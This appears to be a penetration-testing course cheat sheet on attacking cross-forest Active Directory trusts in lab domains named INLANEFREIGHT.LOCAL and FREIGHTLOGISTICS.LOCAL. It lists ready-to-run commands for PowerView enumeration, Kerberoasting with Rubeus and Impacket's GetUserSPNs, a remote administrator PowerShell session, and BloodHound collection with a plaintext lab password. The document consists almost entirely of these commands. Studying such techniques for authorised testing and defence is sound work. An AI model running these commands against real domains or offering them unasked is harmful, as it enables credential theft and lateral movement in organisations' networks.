# Trust Relationships Cross Forest

***

| Command                                                                                                        | Description                                                                                                                                    |
| -------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName`                                  | PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host.                                                     |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof`           | PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host.                                                             |
| `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`                                | Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host.  |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`                                                  | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.                                 |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.                                              |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`                       | Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`                   | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host.                                        |
| `zip -r ilfreight_bh.zip *.json`                                                                               | Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI.                                              |
